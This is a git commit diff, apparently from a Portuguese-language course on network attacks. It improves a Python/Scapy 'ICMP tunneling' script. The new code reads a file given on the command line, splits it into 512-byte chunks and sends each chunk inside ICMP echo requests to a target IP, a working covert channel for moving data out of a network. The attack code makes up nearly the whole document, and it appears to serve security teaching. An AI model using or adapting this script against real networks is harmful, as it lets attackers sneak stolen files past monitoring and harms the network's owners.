ed8469e5bcb070db76ce96a4cc95721ec3fec676
Gustavo Naldoni <gunaldoni@gmail.com>
2024-08-02 17:17:58 -0300

    Improvements on ICMP Tunneling

--- Secao04AtaquesEnlaceRede/ICMPTunneling/icmp_tunneling.py
+++ Secao04AtaquesEnlaceRede/ICMPTunneling/icmp_tunneling.py
@@ -9,23 +9,41 @@ MAX = 512
 
 
 class ICMPTunneler:
-    def __init__(self, victim_ip: str, data: bytes = b"abcdef") -> None:
+    def __init__(self, victim_ip: str, file_path: str) -> None:
         self.victim_ip = victim_ip
-        self.data = data
+        self.file_path = file_path
 
     def send(self):
         ip = IP(dst=self.victim_ip)
         icmp = ICMP(type=8, code=0)
 
-        packet = ip / icmp / self.data
-        packet.show()
+        buffer = b""
 
-        send(packet)
+        with open(self.file_path, "rb") as file:
+            file_size = os.path.getsize(self.file_path)
+            
+            i = 1
+
+            while file_size > 0:
+                try:
+                    buffer = file.read(MAX)
+                    file_size -= MAX
+
+                    packet = ip / icmp / buffer
+                    send(packet, verbose=False)
+
+                    print(f"[*] Packet {i} sent. {file_size} bytes remaining ...")
+                    i += 1
+
+                    time.sleep(2)
+                except KeyboardInterrupt:
+                    print("Keyboard interruption. Quiting ...")
+                    sys.exit()
 
     def sniff(self):
         pass
 
-    def run(self, must_sniff: bool = True):
+    def run(self, must_sniff: bool = False):
         self.send_thread = threading.Thread(target=self.send)
         self.send_thread.start()
 
@@ -35,20 +53,11 @@ class ICMPTunneler:
 
 
 def main():
-    icmp_tunneler = ICMPTunneler("192.168.56.103")
-    file_path = sys.argv[1]
+    victim_ip = sys.argv[1]
+    file_path = sys.argv[2]
 
-    with open(file_path, "rb") as file:
-        file_size = os.path.getsize(file_path)
-
-        while file_size > 0:
-            buffer = file.read(MAX)
-            file_size -= MAX
-
-            icmp_tunneler.data = buffer
-            icmp_tunneler.run()
-
-            time.sleep(2)
+    icmp_tunneler = ICMPTunneler(victim_ip, file_path)
+    icmp_tunneler.run()
 
 
 if __name__ == "__main__":
